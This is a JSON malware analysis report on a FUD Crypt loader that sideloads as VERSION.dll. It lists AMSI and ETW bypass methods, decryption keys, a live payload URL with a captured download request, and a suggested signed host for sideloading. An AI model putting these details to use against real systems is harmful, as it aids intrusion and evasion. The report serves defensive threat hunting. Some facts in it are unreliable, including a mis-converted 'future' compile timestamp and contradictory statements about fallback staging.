@@ -1,0 +1,346 @@
+{
+  "schema_version": 1,
+  "analyst": "Tao Goldi",
+  "analysis_date": "2026-04-26",
+  "family": "FUD Crypt (VERSION.dll carrier)",
+  "aliases": ["VerShadow (analyst-internal nickname)"],
+  "vendor_panel": "fudcrypt.net (MaaS)",
+  "summary": "Native x86_64 DLL compiled with MinGW-w64 GCC that masquerades as VERSION.dll, abuses DLL search-order sideloading to obtain execution inside a signed host, then patches ETW, defangs AmsiScanBuffer with hardware breakpoints, downloads an RC4+XOR-encrypted .NET assembly from files.catbox.moe and runs it in-process via mscoree/_AppDomain.Load_3. Identified as a FUD Crypt platform build (20 carrier profiles documented; this sample is the VERSION.dll carrier). Catbox.moe URL is the documented fallback staging path; primary is Dropbox.",
+  "attribution": {
+    "platform": "FUD Crypt (MaaS, fudcrypt.net)",
+    "researcher_disclosure": "Ctrl-Alt-Intel - 200 registered users, 334 builds, 38 days observation window",
+    "carrier_set_size": 20,
+    "documented_carriers": ["Zoom", "ProtonVPN", "Slack", "Visual Studio Code", "OneDrive", "CCleaner", "WindowsDF.exe (mpclient.dll loader)"],
+    "likely_host_for_this_carrier": {
+      "primary_candidate": "Microsoft OneDrive (OneDrive.exe in %LOCALAPPDATA%\\Microsoft\\OneDrive\\)",
+      "rationale": [
+        "Carrier is host-agnostic at runtime: DllMain does not check parent process name/path, so any 64-bit signed binary that imports VERSION.dll and calls one of the 17 forwarded exports will trigger DoWork",
+        "OneDrive imports VERSION.dll natively and is 64-bit since 2020 - matches the PE32+ x86_64 carrier",
+        "OneDrive installs into per-user user-writable path requiring no elevation",
+        "Microsoft Authenticode-signed parent inherits Microsoft trust on EDR queries, pairs with FUD Crypt's documented Microsoft Azure Trusted Signing abuse for the stage-2 .NET",
+        "OneDrive.exe + version.dll is the single most-abused VERSION.dll sideload vector in the wild (Palo Alto Unit 42 2022, multiple public PoCs, Brute Ratel C4, dedicated Splunk detection rule)"
+      ],
+      "secondary_candidates": [
+        "CCleaner.exe (Piriform-signed, also imports VERSION.dll, in FUD Crypt carrier list)",
+        "Zoom.exe and helpers (some import VERSION.dll)"
+      ],
+      "ruled_out_from_carrier_set": [
+        "Visual Studio Code (Code.exe is an Electron app, does not import VERSION.dll directly)",
+        "Slack (Electron, same reason)",
+        "WindowsDF.exe + mpclient.dll (different carrier, sideloads mpclient.dll not version.dll)"
+      ],
+      "confidence": "best-guess match from static characteristics + documented carrier catalogue; no direct evidence (no original drop path preserved, HA detonated under rundll32.exe generic harness)",
+      "hunting_pivot": "version.dll loaded from %LOCALAPPDATA%\\Microsoft\\OneDrive\\ (or any non-System32 path) by a Microsoft-signed parent, with WININET activity to files.catbox.moe or Dropbox, parent thread carries non-zero DR0/DR7"
+    },
+    "primary_staging": "Dropbox",
+    "fallback_staging": "files.catbox.moe",
+    "documented_c2": "mstelemetrycloud.com",
+    "documented_persistence": ["registry Run key WindowsUpdateSvc", "scheduled task MicrosoftEdgeUpdateCore"],
+    "code_signing_abuse": "Microsoft Azure Trusted Signing"
+  },
+  "sample": {
+    "file_name": "c73947cf188f442bed228f62a3ba5611009fdc2f1878aaed7065db95ede05521.exe",
+    "sha256": "c73947cf188f442bed228f62a3ba5611009fdc2f1878aaed7065db95ede05521",
+    "size_bytes": 243204,
+    "format": "PE32+ DLL (x86_64)",
+    "machine": "AMD64",
+    "subsystem": "WINDOWS_GUI",
+    "image_base": "0x2bd2d0000",
+    "entry_point_rva": "0x1350",
+    "exports_dll_name": "VERSION.dll",
+    "compile_timestamp_raw": 1774216683,
+    "compile_timestamp_iso": "2026-11-26T21:18:03Z",
+    "compile_timestamp_note": "future date relative to first-seen, treat as forged",
+    "compiler": "x86_64-w64-mingw32 GCC (GNU C99 9.3-win32 / 10-win32, -O2 -fno-PIE -g)",
+    "imphash": "e2c01fb3adc4845e1ae802a2da8afff9",
+    "md5":  "3201f19c0bb2ddf430ae6da4d30a8cd9",
+    "sha1": "9215d1233d6110b156480cc70d79afdf49181d37",
+    "tlsh": "T1FC341D91B281FDB6DC698F7820D25309A3BAF081971DEB2F6620FE3C025EB54D573685",
+    "ssdeep_section_/19": "3072:GVl7xAaEt0S+0tKnkBsT2Z3KVuGHyKOiZPCPU2j:O7CaEuS+sKnka2NKVuGHyLiZd2j",
+    "tls_callbacks": [
+      {"va": "0x2bd2d23b0", "name": "__dyn_tls_init (MinGW CRT, benign)"},
+      {"va": "0x2bd2d2380", "name": "__dyn_tls_dtor (MinGW CRT, benign)"}
+    ],
+    "overlay": {
+      "size_bytes": 30212,
+      "type": "MinGW-w64 COFF symbol table left in by the linker (.symtab style)",
+      "fingerprints": ["leading bytes show '.file' record + 'crtdll.c'", "trailing bytes contain mangled C++ symbol names"],
+      "implication": "another self-doxing artifact alongside the DWARF /19 section - operator did not strip the binary"
+    },
+    "build_artifacts": [
+      "DWARF debug section /19 retained (~157 KB)",
+      "MinGW-w64 CRT pseudo-relocator and TLS stubs present",
+      "Source path leak: ./mingw-w64-crt/crt/crtdll.c",
+      "30 KB COFF symbol table overlay appended after last section"
+    ]
+  },
+  "static_indicators": {
+    "exports_proxied": [
+      "GetFileVersionInfoA", "GetFileVersionInfoByHandle",
+      "GetFileVersionInfoExA", "GetFileVersionInfoExW",
+      "GetFileVersionInfoSizeA", "GetFileVersionInfoSizeExA",
+      "GetFileVersionInfoSizeExW", "GetFileVersionInfoSizeW",
+      "GetFileVersionInfoW", "VerFindFileA", "VerFindFileW",
+      "VerInstallFileA", "VerInstallFileW", "VerLanguageNameA",
+      "VerLanguageNameW", "VerQueryValueA", "VerQueryValueW"
+    ],
+    "imports": {
+      "kernel32.dll": [
+        "AddVectoredExceptionHandler", "CheckRemoteDebuggerPresent",
+        "GetThreadContext", "SetThreadContext", "GetTickCount",
+        "IsDebuggerPresent", "VirtualAlloc", "VirtualProtect",
+        "VirtualQuery", "LoadLibraryA", "GetModuleHandleA",
+        "GetModuleFileNameA", "GetProcAddress", "GetCurrentProcess",
+        "GetCurrentThread", "DisableThreadLibraryCalls",
+        "TlsGetValue", "Sleep"
+      ],
+      "wininet.dll": ["InternetOpenA", "InternetOpenUrlA", "InternetReadFile", "InternetCloseHandle"],
+      "ole32.dll":   ["CoInitializeEx", "CoUninitialize"],
+      "oleaut32.dll":["SafeArrayCreate", "SafeArrayCreateVector",
+                      "SafeArrayAccessData", "SafeArrayUnaccessData",
+                      "SafeArrayDestroy", "SafeArrayPutElement",
+                      "SafeArrayGetUBound", "VariantInit", "VariantClear"],
+      "user32.dll":  ["GetMessageA", "TranslateMessage", "DispatchMessageA"]
+    },
+    "runtime_resolved_apis": [
+      {"dll": "ntdll.dll", "name": "EtwEventWrite", "ror13_hash": "0x2047C3EE", "purpose": "patched to immediate RET (0xC3) to silence ETW telemetry"},
+      {"dll": "amsi.dll",  "name": "AmsiScanBuffer", "ror13_hash": "0x9550151E", "purpose": "hardware breakpoint + VEH bypass returning E_INVALIDARG"}
+    ],
+    "stack_strings": {
+      "c2_url": "https://files.catbox.moe/v5fllr.bin",
+      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+      "amsi_dll_xor11": "70 7C 62 78 3F 75 7D 7D xor 0x11 = amsi.dll",
+      "ntdll_plain": "ntdll.dll",
+      "clr_runtime": "v4.0.30319 (UTF-16LE in .rdata)"
+    },
+    "obfuscation": [
+      "ROR-13 GetProcAddress-by-hash resolver (Metasploit-style)",
+      "Stack-string construction of all sensitive literals",
+      "XOR 0x11 string mask for amsi.dll",
+      "Random C++ name-mangled function symbols (smaLD9BuiQeSQy_DoWork, ZI7vPLTiiXSV, UF86nZQWPjSqH4)"
+    ],
+    "anti_analysis": [
+      "CheckRemoteDebuggerPresent + IsDebuggerPresent gate at top of DoWork",
+      "GetTickCount-driven sleep jitter (1235-2710 ms)",
+      "ETW patch via VirtualProtect+RET prologue write at EtwEventWrite",
+      "AMSI bypass via DR0 hardware breakpoint + VEH returning E_INVALIDARG (0x80070057)",
+      "Decoy data write to non-functional global on debugger detection"
+    ]
+  },
+  "crypto": {
+    "stage1": {
+      "algorithm": "RC4",
+      "key_offset_rva": "0x4030",
+      "key_length": 16,
+      "key_hex": "3089F010897626B235AC34723F5ED64C"
+    },
+    "stage2": {
+      "algorithm": "per-byte SUB+XOR using rolling 32-byte key",
+      "formula": "plain[i] = (rc4_out[i] - key32[(i+1) & 0x1F]) ^ key32[i & 0x1F]",
+      "key_offset_rva": "0x4040",
+      "key_length": 32,
+      "key_hex": "3255803F115D04014145C5D685F6FB26E1E5315FD3E206DD6CB21607F297CB63"
+    }
+  },
+  "clr_loader": {
+    "runtime": "v4.0.30319",
+    "interfaces_used": [
+      "ICLRMetaHost {bd39d1d2-ba2f-486a-89b0-b4b0cb466891}",
+      "ICLRRuntimeInfo (via GetRuntime)",
+      "ICorRuntimeHost CLSID {cb2f6723-ab3a-11d2-9c40-00c04fa30a3e} IID {cb2f6722-ab3a-11d2-9c40-00c04fa30a3e}",
+      "_AppDomain {ea675b47-64e0-3b5f-9be7-f7dc2990730d}"
+    ],
+    "load_chain": [
+      "CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost)",
+      "ICLRMetaHost::GetRuntime(\"v4.0.30319\", IID_ICLRRuntimeInfo)",
+      "ICLRRuntimeInfo::IsLoadable",
+      "ICLRRuntimeInfo::GetInterface(CLSID_CorRuntimeHost, IID_ICorRuntimeHost)",
+      "ICorRuntimeHost::Start",
+      "ICorRuntimeHost::GetDefaultDomain (IUnknown for AppDomain)",
+      "QueryInterface IID__AppDomain",
+      "_AppDomain::Load_3(SAFEARRAY<UI1> of decrypted bytes)",
+      "_Assembly::get_EntryPoint -> MethodInfo",
+      "MethodInfo::Invoke_3(SAFEARRAY of string args)"
+    ]
+  },
+  "iocs": {
+    "network": [
+      {"type": "url",     "value": "hxxps[:]//files[.]catbox[.]moe/v5fllr[.]bin", "context": "stage-2 .NET assembly"},
+      {"type": "domain",  "value": "files[.]catbox[.]moe",                          "context": "anonymous file host abuse"},
+      {"type": "ua",      "value": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
+    ],
+    "host": [
+      {"type": "export_set",   "value": "VERSION.dll proxy with all 17 Ver* / GetFileVersionInfo* exports"},
+      {"type": "string",       "value": "Mingw-w64 runtime failure:"},
+      {"type": "string",       "value": "GCC: (GNU) 9.3-win32 20200320"},
+      {"type": "string",       "value": "GCC: (GNU) 10-win32 20220113"},
+      {"type": "build_path",   "value": "./build/x86_64-w64-mingw32-x86_64-w64-mingw32-crt"},
+      {"type": "build_path",   "value": "./mingw-w64-crt/crt/crtdll.c"}
+    ],
+    "yara_rules": ["VerShadow_Loader", "VerShadow_Resolver_Generic"]
+  },
+  "mitre_attck": [
+    {"id": "T1574.001", "name": "DLL Search Order Hijacking",            "evidence": "exports VERSION.dll API set"},
+    {"id": "T1574.002", "name": "DLL Side-Loading",                      "evidence": "intended deployment alongside signed host"},
+    {"id": "T1622",     "name": "Debugger Evasion",                      "evidence": "CheckRemoteDebuggerPresent + IsDebuggerPresent"},
+    {"id": "T1497.003", "name": "Time-Based Evasion",                    "evidence": "GetTickCount jitter sleep"},
+    {"id": "T1027",     "name": "Obfuscated Files or Information",       "evidence": "stack strings, XOR mask, MinGW C++ random names"},
+    {"id": "T1027.007", "name": "Dynamic API Resolution",                "evidence": "ROR-13 hashed GetProcAddress"},
+    {"id": "T1140",     "name": "Deobfuscate/Decode Files or Information","evidence": "RC4 + 32-byte rolling SUB+XOR"},
+    {"id": "T1562.006", "name": "Indicator Blocking (ETW)",              "evidence": "EtwEventWrite -> RET"},
+    {"id": "T1562.001", "name": "Disable or Modify Tools (AMSI)",        "evidence": "AmsiScanBuffer DR0 breakpoint + VEH E_INVALIDARG"},
+    {"id": "T1620",     "name": "Reflective Code Loading",               "evidence": "_AppDomain.Load_3 from in-memory SafeArray"},
+    {"id": "T1071.001", "name": "Application Layer Protocol: Web",       "evidence": "InternetOpenUrlA HTTPS GET to catbox.moe"},
+    {"id": "T1102",     "name": "Web Service",                           "evidence": "abuse of public anonymous file host"},
+    {"id": "T1055.012", "name": "Process Injection: Process Hollowing",  "evidence": "host process is the running .NET assembly container"}
+  ],
+  "weaknesses": [
+    "DWARF debug section retained (file size 243 KB vs 9 KB of malicious code) - source paths and toolchain leak",
+    "Single hardcoded HTTPS staging URL with no fallback or DGA",
+    "Compile timestamp is in the future (forged)",
+    "Stack strings are easy to recover with Capa or `strings` after a single pass",
+    "RC4 + 32-byte XOR keys are stored in cleartext .data and cover the entire decrypt path",
+    "AMSI bypass leaves a process with non-default DR0/DR7 values - trivial to flag from telemetry",
+    "MinGW import set is unique enough that it stands out among Visual Studio compiled malware"
+  ],
+  "external_intel": {
+    "virustotal": {"status": "unauthenticated probe returned 401; not pivoted from this analysis"},
+    "malwarebazaar": {
+      "status": "loader was on MB on 2026-04-20 (local DB confirms first_seen_archive_date) but no longer returned by get_info; sample retired or moved",
+      "tag_FudCrypt": "no_results"
+    },
+    "hybrid_analysis": {
+      "loader": {
+        "url": "https://www.hybrid-analysis.com/sample/c73947cf188f442bed228f62a3ba5611009fdc2f1878aaed7065db95ede05521",
+        "submission_date": "2026-04-20T23:07:57Z",
+        "submission_name": "c73947cf188f442bed228f62a3ba5611009fdc2f1878aaed7065db95ede05521.bin",
+        "verdict": "malicious",
+        "threat_score": 86,
+        "av_detection_pct": 47,
+        "av_family_label": "Win/malicious_confidence_90% (CrowdStrike Falcon static + ML)",
+        "metadefender_engines": "1/26 (only SentinelOne flagged as Suspicious)",
+        "sandbox_report": {
+          "id": "69e6b42079aaeb902a08ac15",
+          "url": "https://www.hybrid-analysis.com/sample/c73947cf188f442bed228f62a3ba5611009fdc2f1878aaed7065db95ede05521/69e6b42079aaeb902a08ac15",
+          "environment": "Windows 10 64 bit",
+          "indicators": {"informative": 143, "suspicious": 22, "malicious": 2},
+          "characteristics": ["Multi-Process", "Network Traffic", "Sample Crashed"],
+          "contacted_countries": ["USA"],
+          "vx_family": "Suspicious (no specific family attribution)",
+          "captured_http_request": "GET /v5fllr.bin HTTP/1.1\\r\\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\\r\\nHost: files.catbox.moe\\r\\nCache-Control: no-cache",
+          "validation_note": "the captured User-Agent and URL exactly match what was reverse-engineered from the .data stack-strings - independent confirmation of the static analysis",
+          "related_pe_hashes_in_report": [
+            {"sha256": "b1e6a7a3e2597e51836277a32b2bc61aa781c8f681d44dfddea618b32e2bf2a6", "what": "C:\\\\Windows\\\\System32\\\\rundll32.exe (host process used to load the DLL)"},
+            {"sha256": "0476d175606aac098363c328166a33f85b7efc2d0be82c0d80ba406113affbfe", "what": "C:\\\\Windows\\\\System32\\\\WerFault.exe (Windows Error Reporting; explains the Sample Crashed characteristic)"},
+            {"sha256": "d7390d26c091d465e6b124fd25b54253eb6125efefe5f3e88bc3931efd072433", "what": "unidentified (sandbox artifact; no surrounding context)"}
+          ],
+          "mitre_techniques_seen": [
+            "T1059 Command and Scripting Interpreter",
+            "T1055 Process Injection",
+            "T1071 Application Layer Protocol",
+            "T1083 File and Directory Discovery",
+            "T1090 Proxy",
+            "T1105 Ingress Tool Transfer",
+            "T1134.001 Token Impersonation/Theft",
+            "T1140 Deobfuscate/Decode",
+            "T1497 / T1497.001 Sandbox Evasion",
+            "T1543 Create or Modify System Process",
+            "T1553 Subvert Trust Controls",
+            "T1562 Impair Defenses (matches AMSI/ETW)",
+            "T1564 Hide Artifacts",
+            "T1573 Encrypted Channel (matches RC4 + 32-byte rolling XOR)"
+          ]
+        },
+        "comments": {"count": 0, "votes": "0 / 0", "blog_posts": []}
+      },
+      "stage2": {
+        "url": "https://www.hybrid-analysis.com/sample/86e9024c21478f7fa59bf95aef8e7bfb869ed872e8a92e7ca19118df0f74f457",
+        "submission_date": "2026-04-20T22:59:44Z",
+        "type": "PE32 .NET assembly, 3 sections, 4 KiB",
+        "verdict": "no specific threat",
+        "threat_score": null,
+        "av_detection_pct": 0,
+        "comments": {"count": 0}
+      },
+      "operator_qa_timeline": {
+        "step_1_22_59_44_UTC": "operator submitted clean .NET test payload (86e9024c) to HA - 0% detection baseline",
+        "step_2_~23_00_UTC":  "operator encrypted that exact payload with RC4 (3089F010...) + 32-byte rolling key (3255803F...) and uploaded ciphertext to https://files.catbox.moe/v5fllr.bin",
+        "step_3_23_07_57_UTC": "operator submitted carrier DLL (c73947cf) to HA - 47% detection",
+        "elapsed": "8 min 13 s between QA test payload and live carrier - tight enough to attribute both to a single operator workflow",
+        "circular_confirmation": "decrypt_stage2.py output sha256 86e9024c... is identical to the cleartext .NET assembly the operator uploaded to HA 8 minutes earlier - end-to-end pipeline validated"
+      }
+    },
+    "web_search": {
+      "loader_hash":  "no public references on Google/Bing for the SHA256",
+      "stage2_hash":  "no public references on Google/Bing for the SHA256",
+      "url_v5fllr":   "no published sandbox report mentions /v5fllr.bin specifically (other catbox URLs widely reported)"
+    }
+  },
+  "stage2_capture": {
+    "url": "https://files.catbox.moe/v5fllr.bin",
+    "fetched_at": "2026-04-26T19:00Z",
+    "live": true,
+    "raw_size": 4096,
+    "raw_sha256": "3f631c11de145502d509b5c4b94c461da32ebadf010284c826895e253439b2f5",
+    "raw_entropy": 7.955,
+    "decrypted_size": 4096,
+    "decrypted_sha256": "86e9024c21478f7fa59bf95aef8e7bfb869ed872e8a92e7ca19118df0f74f457",
+    "decrypted_format": "PE32 .NET assembly (Mono/.NET, i386)",
+    "decrypted_entropy": 3.759,
+    "verdict": "FUD Crypt builder QA test payload (NOT weaponised)",
+    "decompiled_behavior": "Writes 'dotnet_test_success.txt' to user Desktop with the string 'FudCrypt .NET Build Test - <DateTime.Now>', then displays a MessageBox titled 'FudCrypt Test' with body 'Test payload executed!\\nFile written to: <path>'",
+    "decompiled_class": "TestPayload.Program.Main()",
+    "decompiled_imports": ["System", "System.IO", "System.Reflection", "System.Runtime.CompilerServices", "System.Windows.Forms"],
+    "implication": "Operator left builder QA artifact on the catbox fallback. Real customers ship the encrypted payload via the Dropbox primary path. Confirms the decryption pipeline (RC4 + 32-byte rolling SUB+XOR) is correct and reusable against any FUD Crypt VERSION.dll carrier built with this key pair.",
+    "pe_details": {
+      "machine": "I386",
+      "subsystem": "WINDOWS_CUI",
+      "image_base": "0x400000",
+      "entry_point_rva": "0x25de",
+      "timestamp_raw": 1774215662,
+      "timestamp_iso": "2026-11-26T21:01:02Z",
+      "timestamp_note": "future-dated, forged like the loader",
+      "imphash": "not recorded - imphash on a .NET PE is meaningless because every managed assembly imports only mscoree!_CorExeMain",
+      "md5":  "1c38f7abf65f19221e9f8b1bd345e6bc",
+      "sha1": "d81b50362c2255c0ac46f3ea894b0f2802372a49",
+      "import": "mscoree.dll!_CorExeMain (single import - .NET launcher stub)",
+      "sections": [
+        {"name": ".text",  "vsize": 1508, "raw": 1536, "purpose": "CIL bytecode + COR20 header + #~ metadata"},
+        {"name": ".rsrc",  "vsize": 1288, "raw": 1536, "purpose": "VS_VERSION_INFO + side-by-side manifest"},
+        {"name": ".reloc", "vsize": 12,   "raw": 512,  "purpose": "single relocation for _CorExeMain thunk"}
+      ],
+      "cor20": {
+        "size": 72,
+        "runtime_version": "2.5",
+        "metadata_rva": "0x20b4",
+        "metadata_size": 1244,
+        "flags": "0x1 (COMIMAGE_FLAGS_ILONLY)",
+        "entry_token": "0x06000001 (MethodDef row 1 = TestPayload.Program.Main)"
+      },
+      "resources": ["RT_GROUP_ICON (16) - empty/placeholder", "RT_VERSION (16) - VS_VERSION_INFO with OriginalFilename=test_dotnet_payload.exe"],
+      "version_info": {
+        "OriginalFilename": "test_dotnet_payload.exe",
+        "InternalName":     "test_dotnet_payload.exe",
+        "FileVersion":      "0.0.0.0",
+        "ProductVersion":   "0.0.0.0",
+        "Assembly Version": "0.0.0.0"
+      },
+      "manifest": "default Visual Studio app.manifest (asInvoker, uiAccess=false, name=MyApplication.app)",
+      "managed_references": ["mscorlib", "System", "System.IO", "System.Reflection", "System.Runtime.CompilerServices", "System.Windows.Forms"]
+    },
+    "yara_rule": "FudCrypt_Test_Payload_Stage2 (detection/fudcrypt_test_payload.yar)"
+  },
+  "candidate_attribution": [
+    "Confirmed: FUD Crypt MaaS platform (fudcrypt.net) - VERSION.dll carrier variant",
+    "Catbox.moe is the documented fallback staging location for FUD Crypt (Dropbox is the primary)",
+    "AMSI bypass via direct memory patch + hardware breakpoint + VEH matches Ctrl-Alt-Intel reporting",
+    "ETW silenced with single-byte patch matches Ctrl-Alt-Intel reporting"
+  ],
+  "follow_ups": [
+    "Hunt other FUD Crypt carriers (mpclient.dll for WindowsDF, plus 19 other DLL profiles) using the ROR-13 resolver YARA rule",
+    "Pivot on the 16-byte RC4 key and 32-byte rolling key as YARA conditions to surface other builds (key may rotate per build / per carrier)",
+    "Detect downstream activity: registry Run key WindowsUpdateSvc, scheduled task MicrosoftEdgeUpdateCore, network beacon to mstelemetrycloud.com",
+    "Cross-reference Microsoft Azure Trusted Signing certs on signed parents that loaded VERSION.dll from the same directory",
+    "Watch the Dropbox primary path; catbox is a fallback only and likely retains stale QA payloads"
+  ]
+}
